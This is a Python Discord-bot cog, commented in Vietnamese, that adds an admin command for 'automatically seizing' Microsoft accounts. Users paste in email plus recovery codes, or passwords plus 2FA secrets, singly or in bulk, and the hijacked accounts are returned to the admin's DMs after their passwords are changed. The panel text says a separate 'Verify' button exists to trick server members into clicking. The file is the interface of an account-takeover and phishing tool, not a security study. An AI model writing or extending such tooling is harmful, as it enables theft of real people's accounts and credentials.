from ui.modals.recovery_secret_bulk import BulkAuthRecoveryModal
from ui.modals.recovery_code_bulk import BulkRecoveryCodeModal
from ui.modals.recovery_secret import recoveryAuthModal
from ui.modals.recovery_code import recoveryCodeModal
from discord.ext import commands
import discord

from config import get_command_alias

name = get_command_alias("secure")

class SecureView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=180)

    @discord.ui.button(
        label="Recovery Code (1 Acc)",
        style=discord.ButtonStyle.primary,
        row=0
    )
    async def rcode_btn(self, button: discord.ui.Button, interaction: discord.Interaction):
        await interaction.response.send_modal(recoveryCodeModal())

    @discord.ui.button(
        label="Pass + Secret (1 Acc)",
        style=discord.ButtonStyle.primary,
        row=0
    )
    async def secret_btn(self, button: discord.ui.Button, interaction: discord.Interaction):
        await interaction.response.send_modal(recoveryAuthModal())

    @discord.ui.button(
        label="Bulk: Recovery Code",
        style=discord.ButtonStyle.secondary,
        row=1
    )
    async def bulk_rcode_btn(self, button: discord.ui.Button, interaction: discord.Interaction):
        await interaction.response.send_modal(BulkRecoveryCodeModal())

    @discord.ui.button(
        label="Bulk: Pass + Secret",
        style=discord.ButtonStyle.secondary,
        row=1
    )
    async def bulk_secret_btn(self, button: discord.ui.Button, interaction: discord.Interaction):
        await interaction.response.send_modal(BulkAuthRecoveryModal())

class secure(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @discord.slash_command(
        name=name,
        description="Tự động chiếm và đổi info tài khoản Microsoft (Dành cho Admin)"
    )
    async def secure(self, ctx: discord.ApplicationContext):
        if ctx.author.id not in self.bot.admins and len(self.bot.admins) > 0 and 0 not in self.bot.admins:
            await ctx.respond("Ban khong co quyen su dung lenh nay!", ephemeral=True)
            return

        embed = discord.Embed(
            title="Bảng Tự Secu Tài Khoản (Admin)",
            description=(
                "**Công cụ dành cho bạn tự đổi thông tin và chiếm tài khoản:**\n"
                "*(Khác với nút Verify trong server là để dụ thành viên khác bấm)*\n\n"
                "**Recovery Code (1 Acc):**\n"
                "Dùng khi bạn có Email + Mã khôi phục Microsoft 25 ký tự.\n\n"
                "**Pass + Secret (1 Acc):**\n"
                "Dùng khi bạn có Email + Mật khẩu + Mã 2FA TOTP Secret.\n\n"
                "**Secu Hàng Loạt (Bulk):**\n"
                "Dán danh sách nhiều tài khoản cùng lúc để bot xử lý song song.\n\n"
                "***Bấm nút bên dưới để nhập thông tin:**",
            ),
            color=0x2ECC71
        )
        embed.set_footer(text="Acc sau khi đổi pass & dọn sạch sẽ gửi thẳng về DM của bạn")

        await ctx.respond(
            embed=embed,
            view=SecureView(),
            ephemeral=True
        )

def setup(bot: commands.Bot) -> None:
    bot.add_cog(secure(bot))